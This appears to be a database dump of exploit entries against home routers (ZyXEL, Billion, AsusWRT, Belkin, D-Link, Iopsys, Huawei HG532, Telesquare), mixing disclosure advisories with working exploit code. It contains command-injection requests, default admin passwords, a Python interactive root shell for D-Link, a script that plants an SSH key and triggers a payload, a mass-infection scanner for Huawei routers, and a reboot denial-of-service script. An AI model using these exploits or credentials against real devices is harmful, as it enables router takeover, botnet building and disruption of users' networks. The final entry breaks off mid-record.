These vulnerabilities were discovered in July 2016 and reported through Securiteam's Secure Disclosure program (see https://blogs.securiteam.com/index.php/archives/2910 for their advisory). SSD contacted the vendors involved, but received no reply and posted their advisory on December 26th 2016. There is currently no fix for these issues. It is unknown whether these issues are exploitable over the WAN, although this is a possibility since some of the default accounts appear to have been deployed for ISP use.
Three Metasploit modules that abuse these vulnerabilities have been released (see [4], [5] and [6]).
>> Update (18/01/2017):
ZyXEL have responded to this advisory and published information about upcoming fixes for the 660HN v1 and v2 in http://www.zyxel.com/support/announcement_unauthenticated.shtml
>> Technical details:
Vulnerability: Unauthenticated command injection (ZyXEL P660HN-T1A v1)
NO-CVE - use FD:2017/Jan/40-1 (Full Disclosure) or SSD-2910 (SecuriTeam blog)
Attack Vector: Remote
Constraints: Can be exploited by an unauthenticated attacker in the LAN. See below for other constraints.
Affected versions:
- ZyXEL P660HN-T1A, hardware revision v1, TrueOnline firmware version 340ULM0b31, other firmware versions might be affected
This router has a command injection vulnerability in the Maintenance > Logs > System Log > Remote System Log forwarding function.
The vulnerability is in the ViewLog.asp page, which is accessible unauthenticated. The following request will cause the router to issue 3 ping requests to 10.0.99.102:
POST /cgi-bin/ViewLog.asp HTTP/1.1
remote_submit_Flag=1&remote_syslog_Flag=1&RemoteSyslogSupported=1&LogFlag=0&remote_host=%3bping+-c+3+10.0.99.102%3b%23&remoteSubmit=Save
The command in injection is in the remote_host parameter.
This vulnerability was found during a black box assessment of the web interface, so the injection path was not fully investigated. All commands run as root.
Vulnerability: Authenticated command injection (ZyXEL P660HN-T1A v2)
NO-CVE - use FD:2017/Jan/40-2 (Full Disclosure) or SSD-2910 (SecuriTeam blog)
Attack Vector: Remote
Constraints: Can be exploited by an authenticated attacker in the LAN. See below for other constraints.
Affected versions:
- ZyXEL P660HN-T1A, hardware revision v2, TrueOnline firmware version 200AAJS3D0, other firmware versions might be affected
Unlike in the P660HN-Tv1, the injection is authenticated and in the logSet.asp page. However, this router contains several default administrative accounts (see below) that can be used to exploit this vulnerability.
The injection is in the logSet.asp page that sets up remote forwarding of syslog logs, and the parameter vulnerable to command injection is the serverIP parameter.
The following request will cause the router to issue 3 ping requests to 1.1.1.1:
POST /cgi-bin/pages/maintenance/logSetting/logSet.asp HTTP/1.1
logSetting_H=1&active=1&logMode=LocalAndRemote&serverIP=192.168.1.1`ping -c 3 1.1.1.1`%26%23&serverPort=514
This vulnerability was found during a black box assessment of the web interface, so the injection path was not fully investigated. All commands run as root.
It is known that this injection ends up in  /etc/syslog.conf as
ServerIP=""192.168.1.1 `ping -c 3 1.1.1.1`&#""
Which will then be executed by a background process almost immediately.
The actual injection is limited to 28 characters. This can circunvented by writing a shell script file in the /tmp directory 28 characters at a time, and the executing that file.
Vulnerability: Unauthenticated command injection (Billion 5200W-T)
NO-CVE - use FD:2017/Jan/40-3 (Full Disclosure) or SSD-2910 (SecuriTeam blog)
Attack Vector: Remote
Constraints: Can be exploited by an unauthenticated attacker in the LAN. See below for other constraints.
Affected versions:
- Billion 5200W-T, TrueOnline firmware version 1.02b.rc5.dt49, other firmware versions might be affected
The Billion 5200W-T router contains an unauthenticated command injection in adv_remotelog.asp page, which is used to set up remote syslog forwarding.
The following request will cause the router to issue 3 ping requests to 192.168.1.35:
POST /cgi-bin/adv_remotelog.asp HTTP/1.1
Host: 192.168.1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 85
RemotelogEnable=1&syslogServerAddr=1.1.1.1%3bping+-c+3+192.168.1.35%3b&serverPort=514
The injection is on the syslogServerAddr parameter and can be exploited by entering a valid IP address, followed by  "";<COMMAND>;""
This vulnerability was found during a black box assessment of the web interface, so the injection path was not fully investigated. All commands run as root.
Vulnerability: Authenticated command injection (Billion 5200W-T)
NO-CVE - use FD:2017/Jan/40-4 (Full Disclosure) or SSD-2910 (SecuriTeam blog)
Attack Vector: Remote
Constraints: Can be exploited by an authenticated attacker in the LAN. See below for other constraints.
Affected versions:
- Billion 5200W-T, TrueOnline firmware version TCLinux Fw $7.3.8.0 v008 130603, other firmware versions might be affected
The Billion 5200W-T router also has several other command injections in its interface, depending on the firmware version, such as an authenticated command injection in tools_time.asp (uiViewSNTPServer parameter).
It should be noted that this router contains several default administrative accounts that can be used to exploit this vulnerability.
This injection can be exploited with the following request:
POST /cgi-bin/tools_time.asp HTTP/1.1
Host: 192.168.1.1
Authorization: Basic YWRtaW46cGFzc3dvcmQ=
Cookie: SESSIONID=7c082c75
SaveTime=1&uiCurrentTime2=&uiCurrentTime1=&ToolsTimeSetFlag=0&uiRadioValue=0&uiClearPCSyncFlag=0&uiwPCdateMonth=0&uiwPCdateDay=&uiwPCdateYear=&uiwPCdateHour=&uiwPCdateMinute=&uiwPCdateSec=&uiCurTime=N%2FA+%28NTP+server+is+connecting%29&uiTimezoneType=0&uiViewSyncWith=0&uiPCdateMonth=1&uiPCdateDay=&uiPCdateYear=&uiPCdateHour=&uiPCdateMinute=&uiPCdateSec=&uiViewdateToolsTZ=GMT%2B07%3A00&uiViewdateDS=Disable&uiViewSNTPServer=""%3b+ping+-c+20+192.168.0.1+%26%23&ntp2ServerFlag=N%2FA&ntp3ServerFlag=N%2FA
This writes the command to a file /etc/ntp.sh:
/userfs/bin/ntpclient -s -c 3 -l -h """"; ping -c 20 192.168.0.1 &#"" &
which is then executed almost immediately.
This vulnerability was found during a black box assessment of the web interface, so the injection path was not fully investigated. All commands run as root.
Vulnerability: Default administrative credentials (ZyXEL P660HN-T1A v1)
NO-CVE - use FD:2017/Jan/40-5 (Full Disclosure) or SSD-2910 (SecuriTeam blog)
Attack Vector: Remote
Constraints: N/A
Affected versions:
- ZyXEL P660HN-T1A, hardware revision v1, TrueOnline firmware version 340ULM0b31, other firmware versions might be affected
This router contains the following default administrative accounts:
username: admin; password: password
username: true; password: true
Vulnerability: Default administrative credentials (ZyXEL P660HN-T1A v2)
NO-CVE - use FD:2017/Jan/40-6 (Full Disclosure) or SSD-2910 (SecuriTeam blog)
Attack Vector: Remote
Constraints: N/A
Affected versions:
- ZyXEL P660HN-T1A, hardware revision v2, TrueOnline firmware version 200AAJS3D0, other firmware versions might be affected
This router contains the following default administrative accounts:
username: admin; password: password
username: true; password: true
username: supervisor; password: zyad1234
Vulnerability: Default administrative credentials (Billion 5200W-T)
NO-CVE - use FD:2017/Jan/40-7 (Full Disclosure) or SSD-2910 (SecuriTeam blog)
Attack Vector: Remote
Constraints: N/A
Affected versions:
- Billion 5200W-T, TrueOnline firmware version TCLinux Fw $7.3.8.0 v008 130603, other firmware versions might be affected
This router contains the following default administrative accounts:
username: admin; password: password
username: true; password: true
username: user3; password: 12345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678
>> Fix:
There is NO FIX for this vulnerability. Do not allow untrusted clients to connect to these routers. Timeline of disclosure:
July 2016: Vulnerability reported to Securiteam Secure Disclosure
Securiteam contacted the affected versions. No response.
26.12.2016: Vulnerability information published in the SSD blog (https://blogs.securiteam.com/index.php/archives/2910 for their advisory).
12.01.2017: Vulnerability information published in https://github.com/pedrib/PoC
18.01.2017: ZyXEL have responded to this advisory and published information about upcoming fixes for the 660HN v1 and v2 in http://www.zyxel.com/support/announcement_unauthenticated.shtml
>> References:
[1] http://www.kb.cert.org/vuls/id/561444
[2] https://k0st.wordpress.com/2015/07/05/identifying-and-exploiting-rom-0-vulnerabilities/
[3] https://vasvir.wordpress.com/tag/trendchip-firmware/
[4] https://github.com/rapid7/metasploit-framework/pull/7820
[5] https://github.com/rapid7/metasploit-framework/pull/7821
[6] https://github.com/rapid7/metasploit-framework/pull/7822
Agile Information Security Limited
>> Enabling secure digital business >>"
2018-01-22,Remote,Hardware,Pedro Ribeiro,AsusWRT Router < 3.0.0.4.380.7743,LAN Remote Code Execution,"#1
//if(!fromapp) http_logout(login_ip_tmp, cookies);
#2
//printf(""%s=%s\n"", name, value);
http://www.agileinfosec.co.uk/",">> Unauthenticated LAN remote code execution in AsusWRT
>> Discovered by Pedro Ribeiro (pedrib@gmail.com), Agile Information Security
Disclosure: 22/01/2018 / Last updated: 25/01/2018
>> Background and summary
AsusWRT is the operating system used in mid range and high end Asus routers. It is based on Linux, but with a sleek web UI and a slimmed down profile suitable for running on resource constrained routers.
Thankfully ASUS is a responsible company, and not only they publish the full source code as required by the GPL, but they also give users full root access to their router via SSH. Overall the security of their operating system is pretty good, especially when compared to other router manufacturers.
However due to a number of coding errors, it is possible for an unauthenticated attacker in the LAN to achieve remote code execution in the router as the root user.
A special thanks to Beyond Security SecuriTeam Secure Disclosure (SSD) programme for disclosing these vulnerabilities to the manufacturer, speeding the resolution of the issues discovered (see [1] for their advisory).
>> Technical details:
Vulnerability: HTTP server authentication bypass
CVE-2018-5999
Attack Vector: Remote
Constraints: None; exploitable by an unauthenticated attacker
Affected versions: confirmed on v3.0.0.4.380.7743; possibly affects every version before v3.0.0.4.384.10007
The AsusWRT HTTP server has a flaw in handle_request() that allows an unauthenticated user to perform a POST request for certain actions.
In AsusWRT_source/router/httpd/httpd.c:
handle_request(void)
handler->auth(auth_userid, auth_passwd, auth_realm);
auth_result = auth_check(auth_realm, authorization, url, file, cookies, fromapp);
if (auth_result != 0)                                     <--- auth fails
if(strcasecmp(method, ""post"") == 0){
if (handler->input) {
handler->input(file, conn_fp, cl, boundary);        <--- but POST request is still processed
send_login_page(fromapp, auth_result, NULL, NULL, 0);
return;
This can (and will) be combined with other vulnerabilities to achieve remote code execution.
Vulnerability: Unauthorised configuration change (NVRAM value setting)
CVE-2018-6000
Attack Vector: Remote
Constraints: None; exploitable by an unauthenticated attacker
Affected versions: confirmed on v3.0.0.4.380.7743; possibly affects every version before v3.0.0.4.384.10007
By abusing vulnerability #1 and POSTing to vpnupload.cgi, we can invoke do_vpnupload_post() in the HTTP server code, which has a vulnerability that allows an attacker to set NVRAM configuration values directly from the request.
In AsusWRT_source/router/httpd/web.c:
do_vpnupload_post(char *url, FILE *stream, int len, char *boundary)
if (!strncasecmp(post_buf, ""Content-Disposition:"", 20)) {
if(strstr(post_buf, ""name=\""file\""""))
break;
else if(strstr(post_buf, ""name=\"""")) {
offset = strlen(post_buf);
fgets(post_buf+offset, MIN(len + 1, sizeof(post_buf)-offset), stream);
len -= strlen(post_buf) - offset;
offset = strlen(post_buf);
fgets(post_buf+offset, MIN(len + 1, sizeof(post_buf)-offset), stream);
len -= strlen(post_buf) - offset;
p = post_buf;
name = strstr(p, ""\"""") + 1;
p = strstr(name, ""\"""");
strcpy(p++, ""\0"");
value = strstr(p, ""\r\n\r\n"") + 4;
p = strstr(value, ""\r"");
strcpy(p, ""\0"");
nvram_set(name, value);
These NVRAM values contain very important configuration variables, such as the admin password, which can be set in this way by an authenticated or unauthenticated attacker.
Once that is done, code execution is easily achieved. One option is to login to the web interface with the new password, enable SSH, reboot the router and login via SSH.
A more elegant option is to abuse infosvr, which is a UDP daemon running on port 9999.
The daemon has a special mode where it executes a command received in a packet as the root user. This special mode is only enabled if ateCommand_flag is set to 1, which most likely only happens during factory testing or QA (it was not enabled by default in the firmware distributed by Asus in their website).
However we can set ateCommand_flag to 1 using the VPN configuration upload technique described above and then send a PKT_SYSCMD to infosvr. The daemon will read a command from the packet and execute it as root, achieving our command execution cleanly - without changing any passwords.
(Note: infosvr used to allow unauthenticated command execution without the ateCommand_flag being set, which led to Joshua Drake's (jduck) discovery of CVE-2014-9583, see [2]; this was fixed by Asus in early 2015).
Packet structure (from AsusWRT_source/router/shared/iboxcom.h):
- Header
typedef struct iboxPKTEx
BYTEServiceID;
BYTEPacketType;
WORDOpCode;
DWORD Info; // Or Transaction ID
BYTEMacAddress[6];
BYTEPassword[32];   //NULL terminated string, string length:1~31, cannot be NULL string
} ibox_comm_pkt_hdr_ex;
- Body
typedef struct iboxPKTCmd
WORDlen;
BYTEcmd[420];<--- command goes here
} PKT_SYSCMD;// total 422 bytes
A Metasploit module exploiting this vulnerability has been released [3].
>> Fix:
Upgrade to AsusWRT v3.0.0.4.384.10007 or above.
See [4] for the very few details and new firmware released by Asus.
>> References:
[1] https://blogs.securiteam.com/index.php/archives/3589
[2] https://github.com/jduck/asus-cmd
[3] https://raw.githubusercontent.com/pedrib/PoC/master/exploits/metasploit/asuswrt_lan_rce.rb
[4] https://www.asus.com/Static_WebPage/ASUS-Product-Security-Advisory/
Agile Information Security Limited
>> Enabling secure digital business >>"
2018-01-17,WebApps,Hardware,Wadeek,Belkin N600DB Wireless Router,Multiple Vulnerabilities,"# Exploit Title: Belkin N600DB Wireless Router | Multiple Vulnerabilities
# Date: 16/01/2018
# Exploit Author: Wadeek
# Hardware Version: F9K1102as v3
# Firmware Version: 3.04.11
# Vendor Homepage: http://www.belkin.com/fr/support/product/?pid=F9K1102as
# Firmware Link: http://cache-www.belkin.com/support/dl/F9K1102_WW_3.04.11.bin
http://192.168.2.1/dev.htm","== Wireless Fingerprinting ==
:ESSID: ""belkin.XXX""
:Mode: Master
:Encryption key WPA2 Version 1 CCMP PSK: on
:Wireless Password/PIN: 8-alphanumeric
:DHCP: enable (192.168.2.1)
:MAC Address: 58:EF:68
== Web Fingerprinting (With Locked Web Interface) ==
:www.shodan.io: ""Server: httpd"" ""Cache-Control: no-cache,no-store,must-revalidate, post-check=0,pre-check=0"" ""100-index.htm""
:Device images:
/images/troubleshooting/checkWires.png (600x270)
/images/troubleshooting/startModem.png (600x270)
/images/troubleshooting/stopModem.png (600x270)
/images/troubleshooting/restartRouter.png (600x270)
:Hardware version,Firmware version,Serial number,...: /cgi/cgi_st.js && /cgi/cgi_dashboard.js
== PoC ==
:Disclore wifi password:
curl --silent ""http://192.168.2.1/langchg.cgi""
curl --silent ""http://192.168.2.1/adv_wifidef.cgi""
:Closed ""HTTPD server"" port:
curl --silent ""http://192.168.2.1/removepwd.cgi"" --data """"
:Web Backdoor:
> ?
> sh
:Server-Side Request Forgery (HTTP/FTP):
{45.33.32.156 == scanme.nmap.org}
curl --silent ""http://192.168.2.1/proxy.cgi?chk&url=http://45.33.32.156/""
curl --silent ""http://192.168.2.1/proxy.cgi?chk&url=ftp://45.33.32.156/""
:Command Injection:
curl --silent ""http://192.168.2.1/proxy.cgi?chk&url=--help"""
2018-01-10,WebApps,Hardware,Cr0n1c,D-Link Routers 110/412/615/815 < 1.03,'service.cgi' Arbitrary Code Execution,"#!/usr/bin/python
# Exploit Title: D-Link WAP 615/645/815 < 1.03 service.cgi RCE
# Exploit Author: Cr0n1c
# Vendor Homepage: us.dlink.com
# Software Link: https://github.com/Cr0n1c/dlink_shell_poc/blob/master/dlink_auth_rce
# Version: 1.03
# Tested on: D-Link 815 v1.03
# Going fishing in DEVICE.ACCOUNT looking for CWE-200 or no password
# Did not find it in first attempt
# All attempts failed, just going to return and wish best of luck!","import argparse
import httplib
import random
import re
import requests
import string
import urllib2
DLINK_REGEX = ['Product Page : <a href=""http://support.dlink.com"" target=""_blank"">(.*?)<',
'<div class=""modelname"">(.*?)</div>',
'<div class=""pp"">Product Page : (.*?)<a href=""javascript:check_is_modified"">'
def dlink_detection():
try:
r = requests.get(URL, timeout=10.00)
except requests.exceptions.ConnectionError:
print ""Error: Failed to connect to "" + URL
return False
if r.status_code != 200:
print ""Error: "" + URL + "" returned status code "" + str(r.status_code)
return False
for rex in DLINK_REGEX:
if re.search(rex, r.text):
res = re.findall(rex, r.text)[0]
return res
print ""Warning: Unable to detect device for "" + URL
return ""Unknown Device""
def create_session():
post_content = {""REPORT_METHOD"": ""xml"",
""ACTION"": ""login_plaintext"",
""USER"": ""admin"",
""PASSWD"": PASSWORD,
""CAPTCHA"": """"
try:
r = requests.post(URL + ""/session.cgi"", data=post_content, headers=HEADER)
except requests.exceptions.ConnectionError:
print ""Error: Failed to access "" + URL + ""/session.cgi""
return False
if not (r.status_code == 200 and r.reason == ""OK""):
print ""Error: Did not recieve a HTTP 200""
return False
if not re.search(""<RESULT>SUCCESS</RESULT>"", r.text):
print ""Error: Did not get a success code""
return False
return True
def parse_results(result):
print result[100:]
return result
def send_post(command, print_res=True):
post_content = ""EVENT=CHECKFW%26"" + command + ""%26""
method = ""POST""
if URL.lower().startswith(""https""):
handler = urllib2.HTTPSHandler()
else:
handler = urllib2.HTTPHandler()
opener = urllib2.build_opener(handler)
request = urllib2.Request(URL + ""/service.cgi"", data=post_content, headers=HEADER)
request.get_method = lambda: method
try:
connection = opener.open(request)
except urllib2.HTTPError:
print ""Error: failed to connect to "" + URL + ""/service.cgi""
return False
except urllib2.HTTPSError:
print ""Error: failed to connect to "" + URL + ""/service.cgi""
return False
if not connection.code == 200:
print ""Error: Recieved status code "" + str(connection.code)
return False
attempts = 0
while attempts < 5:
try:
data = connection.read()
except httplib.IncompleteRead:
attempts += 1
else:
break
if attempts == 5:
print ""Error: Chunking failed %d times, bailing."" %attempts
return False
if print_res:
return parse_results(data)
else:
return data
def start_shell():
print ""+"" + ""-"" * 80 + ""+""
print ""| Welcome to D-Link Shell"" + ("" "" * 56) + ""|""
print ""+"" + ""-"" * 80 + ""+""
print ""| This is a limited shell that exploits piss poor programming.  I created this   |""
print ""| to give you a comfort zone and to emulate a real shell environment.  You will  |""
print ""| be limited to basic busybox commands.  Good luck and happy hunting.            |""
print ""|"" + ("" "" * 80) + ""|""
print ""| To quit type 'gtfo'"" + ("" "" * 60) + ""|""
print ""+"" + ""-"" * 80 + ""+\n\n""
cmd = """"
while True:
cmd = raw_input(ROUTER_TYPE + ""# "").strip()
if cmd.lower() == ""gtfo"":
break
send_post(cmd)
def query_getcfg(param):
post_data = {""SERVICES"": param}
try:
r = requests.post(URL + ""/getcfg.php"", data=post_data, headers=HEADER)
except requests.exceptions.ConnectionError:
print ""Error: Failed to access "" + URL + ""/getcfg.php""
return False
if not (r.status_code == 200 and r.reason == ""OK""):
print ""Error: Did not recieve a HTTP 200""
return False
if re.search(""<message>Not authorized</message>"", r.text):
print ""Error: Not vulnerable""
return False
return r.text
def attempt_password_find():
data = query_getcfg(""DEVICE.ACCOUNT"")
if not data:
return False
res = re.findall(""<password>(.*?)</password>"", data)
if len(res) > 0 and res != ""=OoXxGgYy="":
return res[0]
data = query_getcfg(""WIFI"")
if not data:
return False
res = re.findall(""<key>(.*?)</key>"", data)
if len(res) > 0:
return res[0]
return False
if __name__ == ""__main__"":
parser = argparse.ArgumentParser(description=""D-Link 615/815 Service.cgi RCE"")
parser.add_argument(""-p"", ""--password"", dest=""password"", action=""store"", default=None,
help=""Password for the router.  If not supplied then will use blank password."")
parser.add_argument(""-u"", ""--url"", dest=""url"", action=""store"", required=True,
help=""[Required] URL for router (i.e. http://10.1.1.1:8080)"")
parser.add_argument(""-x"", ""--attempt-exploit"", dest=""attempt_exploit"", action=""store_true"", default=False,
help=""If flag is set, will attempt CWE-200.  If that fails, then will attempt to discover ""
""wifi password and use it."")
args = parser.parse_args()
HEADER = {""Cookie"": ""uid="" + """".join(random.choice(string.letters) for _ in range(10)),
""Host"": ""localhost"",
""Content-Type"": ""application/x-www-form-urlencoded; charset=UTF-8""
URL = args.url.lower().strip()
if not URL.startswith(""http""):
URL = ""http://"" + URL
ROUTER_TYPE = dlink_detection()
if not ROUTER_TYPE:
print ""EXITING . . .""
exit()
if args.attempt_exploit and args.password is None:
res = attempt_password_find()
if res:
PASSWORD = res
else:
PASSWORD = """"
print ""[+] Switching password to: "" + PASSWORD
elif args.password:
PASSWORD = args.password
else:
PASSWORD = """"
if not create_session():
print ""EXITING . . .""
exit()
if len(send_post(""ls"", False)) == 0:
print ""Appears this device [%s] is not vulnerable. EXITING . . ."" %ROUTER_TYPE
exit()
start_shell()"
2017-12-23,Remote,Hardware,neonsea,Iopsys Router,'dhcp' Remote Code Execution,"#!/usr/bin/python
#!/bin/sh","import json
import sys
import subprocess
import socket
import os
from time import sleep
from websocket import create_connection
def ubusAuth(host, username, password):
ws = create_connection(""ws://"" + host, header = [""Sec-WebSocket-Protocol: ubus-json""])
req = json.dumps({""jsonrpc"":""2.0"",""method"":""call"",
""params"":[""00000000000000000000000000000000"",""session"",""login"",
{""username"": username,""password"":password}],
""id"":666})
ws.send(req)
response =  json.loads(ws.recv())
ws.close()
try:
key = response.get('result')[1].get('ubus_rpc_session')
except IndexError:
return(None)
return(key)
def ubusCall(host, key, namespace, argument, params={}):
ws = create_connection(""ws://"" + host, header = [""Sec-WebSocket-Protocol: ubus-json""])
req = json.dumps({""jsonrpc"":""2.0"",""method"":""call"",
""params"":[key,namespace,argument,params],
""id"":666})
ws.send(req)
response =  json.loads(ws.recv())
ws.close()
try:
result = response.get('result')[1]
except IndexError:
if response.get('result')[0] == 0:
return(True)
return(None)
return(result)
if __name__ == ""__main__"":
host = ""192.168.1.1""
payload = """"""
/bin/echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAkQMU/2HyXNEJ8gZbkxrvLnpSZ4Xz+Wf3QhxXdQ5blDI5IvDkoS4jHoi5XKYHevz8YiaX8UYC7cOBrJ1udp/YcuC4GWVV5TET449OsHBD64tgOSV+3s5r/AJrT8zefJbdc13Fx/Bnk+bovwNS2OTkT/IqYgy9n+fKKkSCjQVMdTTrRZQC0RpZ/JGsv2SeDf/iHRa71keIEpO69VZqPjPVFQfj1QWOHdbTRQwbv0MJm5rt8WTKtS4XxlotF+E6Wip1hbB/e+y64GJEUzOjT6BGooMu/FELCvIs2Nhp25ziRrfaLKQY1XzXWaLo4aPvVq05GStHmTxb+r+WiXvaRv1cbQ== rsa-key-20170427"" > /etc/dropbear/authorized_keys
/usr/sbin/odhcpd-update
exit 0
print(""Authenticating..."")
key = ubusAuth(host, ""user"", ""password"")
if (not key):
print(""Auth failed!"")
sys.exit(1)
print(""Got key: %s"" % key)
print(""Adding Samba share..."")
smbcheck = json.dumps(ubusCall(host, key, ""uci"", ""get"",
{""config"":""samba""}))
if (""pwned"" in smbcheck):
print(""Samba share seems to already exist, skipping"")
else:
smba = ubusCall(host, key, ""uci"", ""add"",
{""config"":""samba"", ""type"":""sambashare"", ""values"":
{""name"":""pwned"", ""read_only"":""no"", ""create_mask"":""0775"", ""dir_mask"":""0775"",
""path"":""/mnt/"", ""guest_ok"":""yes""}})
if (not smba):
print(""Adding Samba share failed!"")
sys.exit(1)
print(""Enabling Samba..."")
smbe = ubusCall(host, key, ""uci"", ""set"",
{""config"":""samba"", ""type"":""samba"", ""values"":
{""interface"":""lan""}})
if (not smbe):
print(""Enabling Samba failed!"")
sys.exit(1)
print(""Committing changes..."")
smbc = ubusCall(host, key, ""uci"", ""commit"",
{""config"":""samba""})
if (not smbc):
print(""Committing changes failed!"")
sys.exit(1)
print(""Setting malicious leasetrigger..."")
lts = ubusCall(host, key, ""uci"", ""set"",
{""config"":""dhcp"", ""type"":""odhcpd"", ""values"":
{""leasetrigger"":""/mnt/pwn.sh""}})
if (not lts):
print(""Setting leasetrigger failed!"")
sys.exit(1)
print(""Committing changes..."")
ltc = ubusCall(host, key, ""uci"", ""commit"",
{""config"":""dhcp""})
if (not ltc):
print(""Committing changes failed!"")
sys.exit(1)
print(""Rebooting system..."")
reb = ubusCall(host, key, ""juci.system"", ""reboot"")
if (not reb):
print(""Rebooting failed, try rebooting manually!"")
sys.exit(1)
print(""Waiting on reboot..."")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
isUp = None
while (not isUp):
try:
sleep(10)
s.connect((host, 8080))
isUp = True
s.close()
except:
pass
print(""Creating temp file for payload..."")
with open("".payload.tmp"",""a+"") as file:
file.write(payload)
path = os.path.realpath(file.name)
print(""Dropping payload..."")
subprocess.run(r""smbclient \\\\%s\\pwned p -c 'put %s pwn.sh'"" % (host, path),
shell=True, check=True)
print(""Payload dropped"")
print(""Authenticating..."")
key = ubusAuth(host, ""user"", ""password"")
if (not key):
print(""Auth failed!"")
sys.exit(1)
print(""Got key: %s"" % key)
print(""Executing payload"")
eec = ubusCall(host, key, ""juci.service"", ""stop"",
{""name"":""odhcpd""})
if (not eec):
print(""Stopping odhcpd failed!"")
sys.exit(1)
ees = ubusCall(host, key, ""juci.service"", ""start"",
{""name"":""odhcpd""})
if (not ees):
print(""Starting odhcpd failed!"")
sys.exit(1)
print(""Cleaning up..."")
os.remove(path)
print(""Exploitation complete"")"
2017-12-25,WebApps,Hardware,anonymous,Huawei Router HG532,Arbitrary Command Execution,,"import threading, sys, time, random, socket, re, os, struct, array, requests
from requests.auth import HTTPDigestAuth
ips = open(sys.argv[1], ""r"").readlines()
cmd = """" # Your MIPS (SSHD)
rm = ""<?xml version=\""1.0\"" ?>\n    <s:Envelope xmlns:s=\""http://schemas.xmlsoap.org/soap/envelope/\"" s:encodingStyle=\""http://schemas.xmlsoap.org/soap/encoding/\"">\n    <s:Body><u:Upgrade xmlns:u=\""urn:schemas-upnp-org:service:WANPPPConnection:1\"">\n    <NewStatusURL>$("" + cmd + "")</NewStatusURL>\n<NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL>\n</u:Upgrade>\n    </s:Body>\n    </s:Envelope>""
class exploit(threading.Thread):
def __init__ (self, ip):
threading.Thread.__init__(self)
self.ip = str(ip).rstrip('\n')
def run(self):
try:
url = ""http://"" + self.ip + "":37215/ctrlt/DeviceUpgrade_1""
requests.post(url, timeout=5, auth=HTTPDigestAuth('dslf-config', 'admin'), data=rm)
print ""[SOAP] Attempting to infect "" + self.ip
except Exception as e:
pass
for ip in ips:
try:
n = exploit(ip)
n.start()
time.sleep(0.03)
except:
pass"
2017-12-27,WebApps,Hardware,LiquidWorm,Telesquare SKT LTE Router SDT-CS3B1,Information Disclosure,"Summary: We introduce SDT-CS3B1 LTE router which is a SKT 3G and 4G
Desc: Insecure direct object references occur when an application","Telesquare SKT LTE Router SDT-CS3B1 Insecure Direct Object Reference Info Leak
Vendor: Telesquare Co., Ltd.
Product web page: http://www.telesquare.co.kr
Affected version: FwVer: SDT-CS3B1, sw version 1.2.0
LteVer: ML300S5XEA41_090  1 0.1.0
Modem model: PM-L300S
LTE wireless communication based LTE router product.
provides direct access to objects based on user-supplied input. As
a result of this vulnerability attackers can bypass authorization
and access resources and functionalities in the system.
Tested on: lighttpd/1.4.20
Linux mips
Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
@zeroscience
Advisory ID: ZSL-2017-5445
Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5445.php
22.12.2017
/home.html                                  <<  Version and status info leak (firmware, device, type, modem, lte)
/index.html                                 <<  Version and status info leak (firmware, device, type, modem, lte)
/nas/smbsrv.shtml                           <<  Samba server settings (workgroup, netbios name)
/nas/ftpsrv.shtml                           <<  FTP settings
/wifi2g/basic.shtml                         <<  Wireless settings
/admin/status.shtml                         <<  Access point status info leak
/internet/wan.shtml                         <<  WAN settings info leak (wanip, subnet, gateway, macaddr, lteipaddr, dns)
/internet/lan.shtml                         <<  LAN settings info leak (dhcpip, lanip, macaddr, gateway, subnet, dns)
/admin/statistic.shtml                      <<  System statistics info leak
/admin/management.shtml                     <<  System management (account settings, ntp settings, ddns settings)
/serial/serial_direct.shtml                 <<  Direct serial settings (network connection settings, serverip, port)
/admin/system_command.shtml                 <<  System command interface
/internet/dhcpcliinfo.shtml                 <<  DHCP Clients info leak (hostname, macaddr, ipaddr)
/admin/upload_firmware.shtml                <<  Router firmware and lte firmware upgrade
/firewall/vpn_futuresystem.shtml            <<  VPN settings (udp packet transfer, icmp check)
/cgi-bin/lte.cgi?Command=getUiccState       <<  GetUiccState()
/cgi-bin/lte.cgi?Command=getModemStatus     <<  Modem status info leak
/cgi-bin/systemutil.cgi?Command=SystemInfo  <<  System info leak"
2017-12-27,DoS,Hardware,LiquidWorm,Telesquare SKT LTE Router SDT-CS3B1,Denial of Service,"#!/usr/bin/env python
# Telesquare SKT LTE Router SDT-CS3B1 Remote Reboot Denial Of Service
# Vendor: Telesquare Co., Ltd.
# Product web page: http://www.telesquare.co.kr
# Affected version: FwVer: SDT-CS3B1, sw version 1.2.0
#                   LteVer: ML300S5XEA41_090  1 0.1.0
#                   Modem model: PM-L300S
# Summary: We introduce SDT-CS3B1 LTE router which is a SKT 3G and 4G
# LTE wireless communication based LTE router product.
# Desc: The router suffers from an unauthenticated reboot command execution.
# Attackers can exploit this issue to cause a denial of service scenario.
# --------------------------------------------------------------------
# /lte/lteuicc.shtml:
# -------------------
# 858: function RebootRequest()
# 859: {
# 860:     var url = ""../cgi-bin/lte.cgi?"";
# 861:     var param = ""Command=Reboot"";
# 862:     XHRPost(RebootHandle, url, param, false ); //sync call
# 863: }
# --------------------------------------------------------------------
# Tested on: lighttpd/1.4.20
# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
#                             @zeroscience
# Advisory ID: ZSL-2017-5444
# Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5444.php
# 22.12.2017
# shw: while true; do ./b00t.py 10.0.0.17 8081; sleep 20; done
#print r.content  #if in r.content: <xml></xml>, reboot true.","import sys, requests
if len(sys.argv) < 2:
print 'SKT LTE Router SDT-CS3B1 Remote Reboot'
print 'Usage: b00t.py <ip> <port>\n'
quit()
ip = sys.argv[1]
port = sys.argv[2]
r = requests.get(""http://""+ip+"":""+port+""/cgi-bin/lte.cgi?Command=Reboot"")
print ""Router rebooted."""
2017-12-27,WebApps,Hardware,LiquidWorm,Telesquare SKT LTE Router SDT-CS3B1,Cross-Site Request Forgery,"Summary: We introduce SDT-CS3B1 LTE router which is a SKT 3G and 4G
Desc: The router suffers from authenticated arbitrary system command","Telesquare SKT LTE Router SDT-CS3B1 CSRF System Command Execution
Vendor: Telesquare Co., Ltd.
Product web page: http://www.telesquare.co.kr
Affected version: FwVer: SDT-CS3B1, sw version 1.2.0
LteVer: ML300S5XEA41_090  1 0.1.0
Modem model: PM-L300S
